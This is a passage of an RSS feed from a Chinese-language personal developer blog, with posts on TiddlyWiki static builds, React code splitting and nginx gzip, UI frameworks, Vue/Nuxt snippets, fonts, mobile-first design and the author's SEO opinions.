<span class="hljs-addition">+            "text/plain",</span>
            "--render",
            "[all[tiddlers+shadows]tag[$:/plugins/adithyab/tiddlyjam/css]]",
            "[encodeuricomponent[]addprefix[css/]]",
            "text/plain"
        ]
    }
}</code></pre><p>Step 3: 执行</p><pre class="sh hljs"><code>tiddlywiki --build tiddlyjam</code></pre><p>我已经将代码提交到 TiddlyJam，目前还没有 merge。如果你想提前使用，请查看 <a class="tc-tiddlylink-external" href="https://github.com/ThaddeusJiang/tiddlyjam" rel="noopener noreferrer" target="_blank">https://github.com/ThaddeusJiang/tiddlyjam</a>。
</p>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Thu, 29 April 2021 22:1:50 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2021-04-29–zhong-qi-rss</guid>      
   </item>

   <item>
      <title>2021-04-17 Create React App 项目性能优化「将最大文件从 5.1M 减小到 1.4M」</title>
      <link>https://thaddeusjiang.com/2021-04-17-create-react-app–xiang-mu-xing-nen-you-hua–jiang-zui-da-wen-jian-cong-5-1m–jian-xiao-dao-1-4m-</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2021-04-17 Create React App 项目性能优化「将最大文件从 5.1M 减小到 1.4M」</h1>
            <hr>

            <p>2021 年 04 年 01 日，加入新公司，回到了我曾经很熟悉，现在有点手生的 React 生态。起初有一点忐忑，幸好 React 已经很久没有大更新了。</p><p>我们项目使用 Create-React-App 作为打包工具，因为功能的不断增加，bundle 越来越大了，所以我主动做了一点性能优化。</p><blockquote class="tc-quote tc-big-quote"><p>初始页面加载最大文件从 5.1M 减少到 1.4M，文件大小缩小了 3 倍。
</p></blockquote><h2 class="">before</h2><blockquote><div>最大文件 5.1M</div><div>加载时间 1.15s</div></blockquote><p><img src="https://i.gyazo.com/df061819018ab6f9a82f244e57f7889c.jpg"></p><h2 class="">After</h2><blockquote><div>最大文件 1.4M</div><div>加载时间 327ms</div></blockquote><p><img src="https://i.gyazo.com/7086535351835ea6bd98a64d1c46df2b.jpg"></p><h2 class="">我做了什么？</h2><h3 class="">1. Code Splitting</h3><p>Code Splitting 利用到 React.lazy 和 Suspense，代码如下：</p><pre class="diff hljs"><code><span class="hljs-deletion">- import React, { FC, useContext, useEffect } from 'react';</span>
<span class="hljs-addition">+ import React, { FC, Suspense, lazy, useContext, useEffect } from 'react';</span>

<span class="hljs-deletion">- import LoginPage from './pages/LoginPage';</span>
<span class="hljs-deletion">- import OtherPage from './pages/OtherPage';</span>

<span class="hljs-addition">+ const LazyLoginPage = lazy(() =&gt; import('./pages/LoginPage'));</span>
<span class="hljs-addition">+ const LazyOtherPage = lazy(() =&gt; import('./pages/OtherPage'));</span>

&lt;Router&gt;
<span class="hljs-addition">+  &lt;Suspense fallback={&lt;Loading /&gt;}&gt;</span>
    &lt;Switch&gt;
<span class="hljs-deletion">-      &lt;Route path="/login" component={LoginPage} /&gt;</span>
<span class="hljs-deletion">-      &lt;Route path="/other" component={OtherPage} /&gt;</span>
<span class="hljs-addition">+      &lt;Route path="/login" component={LazyLoginPage} /&gt;</span>
<span class="hljs-addition">+      &lt;Route path="/other" component={LazyOtherPage} /&gt;</span>
    &lt;/Switch&gt;
<span class="hljs-addition">+  &lt;/Suspense&gt;</span>
&lt;/Router&gt;</code></pre><h3 class="">2. Nginx gzip on</h3><pre class="diff hljs"><code>server {
    listen       80;
    server_name  _;

    root /usr/share/app/;
    index index.html;

    ...

<span class="hljs-addition">+    gzip on;</span>
<span class="hljs-addition">+    gzip_static on;</span>
<span class="hljs-addition">+    gzip_types text/plain text/css application/json application/x-javascript text/xml application/xml application/xml+rss text/javascript;</span>
<span class="hljs-addition">+    gzip_proxied  any;</span>
<span class="hljs-addition">+    gzip_vary on;</span>
<span class="hljs-addition">+    gzip_comp_level 6;</span>
<span class="hljs-addition">+    gzip_buffers 16 8k;</span>
<span class="hljs-addition">+    gzip_http_version 1.1;</span>
}</code></pre><p>相关阅读：</p><ul><li><a class="tc-tiddlylink tc-tiddlylink-resolves" href="./#2019-05-16--qian-duan-xing-nen-you-hua--yi--xing-nen-ping-gu">2019-05-16 前端性能优化（一）性能评估</a></li></ul><p>参考：</p><ul><li><a class="tc-tiddlylink-external" href="https://reactjs.org/docs/code-splitting.html" rel="noopener noreferrer" target="_blank">https://reactjs.org/docs/code-splitting.html</a></li><li><a class="tc-tiddlylink-external" href="https://nginx.org/en/docs/http/ngx_http_gzip_module.html" rel="noopener noreferrer" target="_blank">https://nginx.org/en/docs/http/ngx_http_gzip_module.html</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Sat, 17 April 2021 21:10:54 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2021-04-17-create-react-app–xiang-mu-xing-nen-you-hua–jiang-zui-da-wen-jian-cong-5-1m–jian-xiao-dao-1-4m-</guid>      
   </item>

   <item>
      <title>2021-04-16 向邪恶的 SEO 低头，我部署了 static site 版本</title>
      <link>https://thaddeusjiang.com/2021-04-16–xiang-xie-e-de-seo–di-tou–wo-bu-shu-liao-static-site–ban-ben</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2021-04-16 向邪恶的 SEO 低头，我部署了 static site 版本</h1>
            <hr>

            <p>2021 年 04 月 16 日，我向邪恶的 SEO 低头了，😂</p><p>我部署了 static site 版本<a class="tc-tiddlylink-external" href="https://thaddeusjiang.com/welcome" rel="noopener noreferrer" target="_blank">https://thaddeusjiang.com/welcome</a></p><p>目前还有没有完全对应所有 features，如果你想查看 TiddlyWiki 版本，请访问 <a class="tc-tiddlylink-external" href="https://ThaddeusJiang.com" rel="noopener noreferrer" target="_blank">https://ThaddeusJiang.com</a></p><h2 class="">手顺</h2><ul><li>第一步：安装回 node.js 版本 TiddlyWiki</li><li>第二步：将所有文件全部拖拽到新建到 TiddlyWiki</li><li>第三步：拖拽 <a class="tc-tiddlylink tc-tiddlylink-resolves" href="./#---plugins-adithyab-tiddlyjam">$:/plugins/adithyab/tiddlyjam</a> 到 TiddlyWiki </li><li>第四步：在 <strong>tiddlywiki.info</strong> 中追加 TiddlyJam tiddlywiki.info 配置</li><li>第五步：为文章添加 Tag <strong><a class="tc-tiddlylink tc-tiddlylink-shadow" href="./#---plugins-adithyab-tiddlyjam-live">$:/plugins/adithyab/tiddlyjam/live</a></strong></li><li>第六步：运行 <code>tiddlywiki ---build tiddlyjam</code></li></ul><pre><code>// TiddlyJam tiddlywiki.info 配置
{
  "build": {
    "tiddlyjam":[
            "--rendertiddlers",
            "[all[tiddlers+shadows]tag[$:/plugins/adithyab/tiddlyjam/live]]",
            "$:/plugins/adithyab/tiddlyjam/renderer/base",
            ".",
            "text/plain",
            "--render",
            "[all[tiddlers+shadows][$:/plugins/adithyab/tiddlyjam/renderer/sitemap]]",
            "sitemap.xml",
            "text/plain"
        ]
  }
}</code></pre>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Fri, 16 April 2021 9:18:9 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2021-04-16–xiang-xie-e-de-seo–di-tou–wo-bu-shu-liao-static-site–ban-ben</guid>      
   </item>

   <item>
      <title>2021-04-15 阅读《图形思考》的意外收获</title>
      <link>https://thaddeusjiang.com/2021-04-15–yue-du–tu-xing-si-kao–de-yi-wai-shou-huo</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2021-04-15 阅读《图形思考》的意外收获</h1>
            <hr>

            <p>去年看过一本《图解即战力》的书，非常赞同，但是并没有在实际生活和工作中实践。主要原因就是不知道如何下手。如果说《图解即战力》是一本侧重理论，那么《图形思考》就更侧重实践。</p><p>这本书很薄，内容也不难，清晰易懂，同时又非常实用。</p><p>书中用简单的商业实例带着读者一步一步使用图形思考问题的本质，看完以后有“原来如此”的感觉。</p><p>关于图形的应用场景和思考方式，书中有很清楚的讲解，不过我想分享几个自己的意外收获。</p><blockquote class="tc-quote tc-big-quote"><p>做读书笔记是，不要以全书为对象，要尽量聚焦一些发人深省且日后对自己有帮助的段落上。</p><p>画图会帮助我们更深刻地理解内容，这比只用马克笔标记要有效果。
</p><cite>《图形思考》</cite></blockquote><p>这段话真的太棒了，直击我的痛点。</p><p>其实我很喜欢读书，也喜欢做读书笔记。但是每次写出来的读书笔记，没能清楚地表达自己的读后感。
以前我一直以为是自己的文笔不行。</p><p>但是仔细想一下，原因可能并不是我的文笔不好，可能是我总是以整本书为对象，试图通过简单的文字概括书籍的核心内容。</p><p>但是这种对书籍核心内容的总结对我又有什么用呢？我已经亲自读过了，不需要这种概括了。这种概括只对那些不愿意亲自阅读，渴望走捷径的人有用。这也就是樊登读书会存在的意义。</p><p>今后的读书笔记要聚焦那些发人深省且今后对自己有帮助的段落。</p>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Sat, 9 January 2021 14:17:56 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2021-04-15–yue-du–tu-xing-si-kao–de-yi-wai-shou-huo</guid>      
   </item>

   <item>
      <title>2021-04-02 永远不要再使用巨型 UI 框架了</title>
      <link>https://thaddeusjiang.com/2021-04-02–yong-yuan-bu-yao-zai-shi-yong-ju-xing-ui–kuang-jia-liao</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2021-04-02 永远不要再使用巨型 UI 框架了</h1>
            <hr>

            <h2 class="">什么是巨型 UI 框架？</h2><ul><li><a class="tc-tiddlylink-external" href="https://ant.design/" rel="noopener noreferrer" target="_blank">https://ant.design/</a></li><li><a class="tc-tiddlylink-external" href="https://material.io/" rel="noopener noreferrer" target="_blank">https://material.io/</a></li><li>...</li></ul><h2 class="">为什么不要再使用巨型 UI 框架？</h2><ol><li>巨型 UI 框架为了泛用性，增加了无数极少使用的属性，增加了学习成本。</li><li>巨型 UI 框架为了保持人气，频繁升级，造成不必要的维护成本。</li><li>巨型 UI 框架为了差异性，定义风格迥异的接口，经验无法轻松应用到其他框架。</li></ol><h2 class="">事例：</h2><p>新公司项目使用 antd 开发，最近我们希望加入 dark mode 特性。</p><p>我开发过 dark mode，其实设计思路特别简单。</p><ol><li>CSS 中关于颜色的部分全部使用 CSS variables</li><li>提供 light.css 和 dark.css 定义 CSS variables</li><li>根据用户选择动态加载 light.css 或者 dark.css</li></ol><blockquote class="tc-quote tc-big-quote"><p>但是，如果你使用 antd，那就麻烦了。
</p></blockquote><p>细节不想回忆了，太闹心了。列一下提纲吧</p><ol><li>不得不引入 react-app-rewired 修改 create-react-app 的默认配置。</li><li>不得不引入 less.js 来读取 less 中定义的变量。</li><li>不得不引入测试大量组件，因为 antd 提供了太多的变量，根本不知道是否遗漏。</li></ol><p>如果你不信邪，可以参考下面资料</p><ul><li><a class="tc-tiddlylink-external" href="https://ant.design/docs/react/customize-theme-cn" rel="noopener noreferrer" target="_blank">https://ant.design/docs/react/customize-theme-cn</a></li><li><a class="tc-tiddlylink-external" href="https://medium.com/@mzohaib.qc/ant-design-dynamic-runtime-theme-1f9a1a030ba0" rel="noopener noreferrer" target="_blank">https://medium.com/@mzohaib.qc/ant-design-dynamic-runtime-theme-1f9a1a030ba0</a></li><li><a class="tc-tiddlylink-external" href="https://pro.ant.design/blog/change-theme-cn" rel="noopener noreferrer" target="_blank">https://pro.ant.design/blog/change-theme-cn</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Fri, 2 April 2021 18:10:41 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2021-04-02–yong-yuan-bu-yao-zai-shi-yong-ju-xing-ui–kuang-jia-liao</guid>      
   </item>

   <item>
      <title>2021-03-13 Customize Vetur for @nuxtjs/compostion-api</title>
      <link>https://thaddeusjiang.com/2021-03-13-customize-vetur-for–nuxtjs-compostion-api</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2021-03-13 Customize Vetur for @nuxtjs/compostion-api</h1>
            <hr>

            <p>分享一个简单的小技巧。</p><p>背景</p><p>我目前在使用 nuxt + @nuxtjs/composition-api，使用 VSCode 输入 <code>ts</code> 时自动生成下面代码：</p><pre class="html hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"ts"</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { defineComponent } <span class="hljs-keyword">from</span> <span class="hljs-string">'@vue/composition-api'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> defineComponent({
  setup() {

  },
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>但是我并不是直接引入 @vue/compsotion-api，我希望引入 @nuxtjs/composition-api。</p><p>解决方法：自定义 Vetur Snippet</p><p>在 .vscode/vetur/snippets 目录下创建 vue-class-component.vue，如下：</p><pre class="html hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"ts"</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { defineComponent } <span class="hljs-keyword">from</span> <span class="hljs-string">'@nuxtjs/composition-api'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> defineComponent({
  setup() {},
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><p>今后只要输入 <code>vue</code> 即可。</p>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Sat, 13 March 2021 13:26:28 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2021-03-13-customize-vetur-for–nuxtjs-compostion-api</guid>      
   </item>

   <item>
      <title>2021-02-15 SEO: 更新网站后，你需要更新 sitemap 吗？</title>
      <link>https://thaddeusjiang.com/2021-02-15-seo—geng-xin-wang-zhan-hou–ni-xu-yao-geng-xin-sitemap–ma-</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2021-02-15 SEO: 更新网站后，你需要更新 sitemap 吗？</h1>
            <hr>

            <h2 class="">当你更新网站 URL 时，你需要更新 sitemap 吗？</h2><p>答：不需要。因为 Google 会自己去爬取。</p><h2 class="">为什么那么多 SEO 专家说需要？</h2><p>答：因为他们需要买给你解决方案，赚你的钱。</p><h2 class="">你凭什么说“不需要”？</h2><p>答：<a class="tc-tiddlylink-external" href="https://www.searchenginejournal.com/resubmit-sitemaps-after-content-changes/267685/#close" rel="noopener noreferrer" target="_blank">https://www.searchenginejournal.com/resubmit-sitemaps-after-content-changes/267685/#close</a></p><h2 class="">可是很多 SEO 专家说：“如果你不更新 sitemap，Google 爬虫会报错。”</h2><p>答：他们说的没错，但是完全不需要介意。报错后，Google 会很快更新 database，不会影响到网站排名。</p><h2 class="">那么 sitemap 还有什么作用？</h2><p>答：讲真，没什么作用。sitemap 根本不会影响 Google 对网站的排名。</p>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Mon, 15 February 2021 23:36:53 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2021-02-15-seo—geng-xin-wang-zhan-hou–ni-xu-yao-geng-xin-sitemap–ma-</guid>      
   </item>

   <item>
      <title>2021-02-08 11 行代码实现邮政编码检索 API</title>
      <link>https://thaddeusjiang.com/2021-02-08-11–xing-dai-ma-shi-xian-you-zheng-bian-ma-jian-suo-api</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2021-02-08 11 行代码实现邮政编码检索 API</h1>
            <hr>

            <p>open source: <a class="tc-tiddlylink-external" href="https://github.com/ThaddeusJiang/jp-post-api" rel="noopener noreferrer" target="_blank">https://github.com/ThaddeusJiang/jp-post-api</a></p><p>Sample:</p><p><iframe allow="accelerometer; ambient-light-sensor; camera; encrypted-media; geolocation; gyroscope; hid; microphone; midi; payment; usb; vr; xr-spatial-tracking" sandbox="allow-forms allow-modals allow-popups allow-presentation allow-same-origin allow-scripts" src="https://codesandbox.io/embed/japan-post-api-example-107u2?fontsize=14&amp;hidenavigation=1&amp;theme=dark&amp;view=preview" style="width:100%; height:500px; border:0; border-radius: 4px; overflow:hidden;" title="Japan Post API Example"></iframe></p><h2 class="">为什么可以 11 行代码实现？</h2><p>因为我对数据进行了预处理，😂</p><p><a class="tc-tiddlylink-external" href="https://github.com/ThaddeusJiang/jp-post-api/blob/master/data/update-data.js" rel="noopener noreferrer" target="_blank">https://github.com/ThaddeusJiang/jp-post-api/blob/master/data/update-data.js</a></p>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Mon, 8 February 2021 15:31:21 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2021-02-08-11–xing-dai-ma-shi-xian-you-zheng-bian-ma-jian-suo-api</guid>      
   </item>

   <item>
      <title>2021-01-31 如何实现英文和中文不同字重？</title>
      <link>https://thaddeusjiang.com/2021-01-31–ru-he-shi-xian-ying-wen-he-zhong-wen-bu-tong-zi-zhong-</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2021-01-31 如何实现英文和中文不同字重？</h1>
            <hr>

            <p>一个非常简单的需求：英文使用 Roboto 字体，中文使用 Noto Serif SC 字体，但是英文的字重是 400，中文的字重是 300 。</p><h2 class="">首先，如何实现英文和中文使用不同字体？</h2><p>直接把英文字体放在中文字体前面就可以了。
</p><h2 class="">其次，如何实现英文和中文使用不同字重？</h2><p>其实特别简单，直接只提供所需字重的字体即可。</p><p>如果你使用 Goole Font，做法如下：</p><p>1. 引入字体</p><pre class="html hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
<span class="hljs-keyword">@import</span> url(<span class="hljs-string">'https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@300&amp;family=Roboto&amp;display=swap'</span>);
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></code></pre><p>2. 使用字体</p><pre class="css hljs"><code>font-family: 'Roboto', 'Noto Serif SC', serif;</code></pre>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Sun, 31 January 2021 21:52:55 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2021-01-31–ru-he-shi-xian-ying-wen-he-zhong-wen-bu-tong-zi-zhong-</guid>      
   </item>

   <item>
      <title>2021-01-22 Is Mobile-First Wrong?</title>
      <link>https://thaddeusjiang.com/2021-01-22-is-mobile-first-wrong-</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2021-01-22 Is Mobile-First Wrong?</h1>
            <hr>

            <p>从阮一峰的科技爱好者周刊中看到一篇文章，让我重新思考这个问题。</p><blockquote class="tc-quote tc-big-quote"><p>Mobile-First 错了吗？
</p></blockquote><p>毕竟这是我工作中坚信不疑的最佳实践。</p><p>先总结一下文章的内容。</p><blockquote class="tc-quote"><p>为什么 Mobile-First 被提倡？</p><ol><li>在所有 Screen Size 都有更好的 UX</li><li>更轻松地组织 CSS Code</li></ol><p>为什么 Mobile-First 在实践中并不好？</p><ol><li>绝大多数 web site 期待的第一显示设备都是 desktop</li><li>Mobile-First 是不自然的（注：因为你不得不省略一些元素）</li><li>Mobile-First 让 web site 变得单调</li></ol></blockquote><p>我基本行认同文章中提到的观点，尤其是 <code>Mobile-First 让 web site 变得单调</code>，这的确值得我们反思，现在的 Web site 基本上都是两列或者单列居中设计，真的是无聊到爆。</p><p>但是我会在实际工作中放弃 Mobile-First 吗？</p><p>回答：不会</p><p>为什么呢？</p><ol><li>Mobile-First 可以帮助我减少 bug，写 Responsive 布局不会遗漏某个 Screen Size 了。</li><li>我的工作主要是开发大型系统，而不是个人网页。更轻松地组织 CSS Code 优先于更酷的页面布局。</li><li>我的工作主要是开发大型系统，大屏才是我的目标客户。</li></ol><p>你怎么看？欢迎在 Twitter 和我讨论</p><p>ref:</p><ul><li><a class="tc-tiddlylink-external" href="http://www.ruanyifeng.com/blog/2021/01/weekly-issue-141.html" rel="noopener noreferrer" target="_blank">http://www.ruanyifeng.com/blog/2021/01/weekly-issue-141.html</a></li><li><a class="tc-tiddlylink-external" href="https://planflow.dev/blog/why-mobile-first-is-a-bad-idea/" rel="noopener noreferrer" target="_blank">https://planflow.dev/blog/why-mobile-first-is-a-bad-idea/</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Fri, 22 January 2021 18:39:37 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2021-01-22-is-mobile-first-wrong-</guid>      
   </item>

   <item>
      <title>2021-01-18 SEO 迷思</title>
      <link>https://thaddeusjiang.com/2021-01-18-seo–mi-si</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2021-01-18 SEO 迷思</h1>
            <hr>

            <h2 class="">1. 增加 link 就能提高 SEO</h2><p>事实：相同 domain 的 link 无论添加多少，都不会对 SEO 有任何影响。所以没有必要在页面中添加多余的 link。</p><h2 class="">2. 每个页面都要有且仅有一个 <code>&lt;h1&gt;</code></h2><p>事实：h1 标签对 SEO 有影响，但不是必须的。如果 UI design 角度不需要大标题（h1），仅设置 document <code>title</code> 就足够了。
</p>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Mon, 18 January 2021 18:5:49 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2021-01-18-seo–mi-si</guid>      
   </item>

   <item>
      <title>2021-01-15 Nuxt Composition API useMeta 异步更新</title>
      <link>https://thaddeusjiang.com/2021-01-15-nuxt-composition-api-usemeta–yi-bu-geng-xin</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2021-01-15 Nuxt Composition API useMeta 异步更新</h1>
            <hr>

            <p>我们项目想提前体验 Vue Composition API 并且享受 Nuxt 的 SSR。
所以使用了 <a class="tc-tiddlylink-external" href="https://composition-api.nuxtjs.org/" rel="noopener noreferrer" target="_blank">@nuxtjs/composition-api</a></p><p>一个小需求，从 API 获取数据，更新 document 的 <code>title</code> 。</p><p>我们使用 <code>useMeta</code></p><pre class="js hljs"><code><span class="hljs-keyword">const</span> { title, meta } = useMeta()

useFetch(<span class="hljs-keyword">async</span> () =&gt; {
  <span class="hljs-keyword">const</span> data  = <span class="hljs-keyword">await</span> someAjax();

  title.value.title = data.title
})</code></pre><p>为什么要写这篇笔记？</p><p>因为官方文档太迷惑了，让我浪费了很多时间。</p><p>官方文档：</p><pre><code>// You can even pass a function to achieve a computed meta
const message = ref('')
useMeta(() =&gt; ({ title: message.value }))</code></pre><p>这段话让我误以为：“如果需要异步更新，就必须以函数形式。”</p><p>实际上并不需要。仅以一篇笔记，纪念我失去的时间。</p><p>参考</p><ul><li><a class="tc-tiddlylink-external" href="https://github.com/nuxt-community/composition-api/issues/116#issuecomment-643707422" rel="noopener noreferrer" target="_blank">https://github.com/nuxt-community/composition-api/issues/116#issuecomment-643707422</a></li></ul>
          </div>
      </div>
      <hr>
  </div>
</div>     


]]></description>
      <pubDate>Fri, 15 January 2021 15:47:4 +09:00</pubDate>
			<guid>https://thaddeusjiang.com/2021-01-15-nuxt-composition-api-usemeta–yi-bu-geng-xin</guid>      
   </item>

   <item>
      <title>2021-01-12 其实你不需要 unicode-range</title>
      <link>https://thaddeusjiang.com/2021-01-12–qi-shi-ni-bu-xu-yao-unicode-range</link>
			<description><![CDATA[this is 
<div class="container">
    <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2 my-4"><p><nav aria-label="main navigation" class="navbar" role="navigation">
        <div class="navbar-brand">
            <a class="navbar-item has-background-dark has-text-white	title is-3" href="./">
       蒋继发 (ThaddeusJiang)
            </a>
        </div>
     </nav></p><p><p class="mt-4">在日本开发 SaaS 产品，爱猫、爱读书、爱大海</p></p></div>
  </div>
      

<div class="container mt-5">
  <div class="column is-6-desktop is-offset-3-desktop is-8 is-offset-2">
      <div>
          <div class="block content blog">
            <h1 class="title">2021-01-12 其实你不需要 unicode-range</h1>
            <hr>

